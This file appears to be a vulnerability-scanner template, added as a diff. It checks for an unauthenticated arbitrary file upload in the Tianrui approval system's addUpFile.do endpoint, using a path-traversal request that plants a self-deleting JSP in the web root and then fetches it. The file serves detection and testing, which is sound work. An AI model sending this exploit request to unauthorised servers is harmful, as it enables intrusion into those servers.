@@ -1,0 +1,55 @@
+id: poc-yaml-tipray-gsas-addupfile-do-anyfile-upload
+info:
+  name: Tianrui Approval System addUpFile.do Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(7)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/trwfe/service/.%2E/file/addUpFile.do"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ89XK7WxiQuU7uq1
+    body: |-
+      ------WebKitFormBoundaryJ89XK7WxiQuU7uq1
+      Content-Disposition: form-data; name="relativepath"
+
+      ../../webapps/ROOT/c
+      ------WebKitFormBoundaryJ89XK7WxiQuU7uq1
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryJ89XK7WxiQuU7uq1
+      Content-Disposition: form-data; name="taskId"
+
+      123456
+      ------WebKitFormBoundaryJ89XK7WxiQuU7uq1--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "true"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
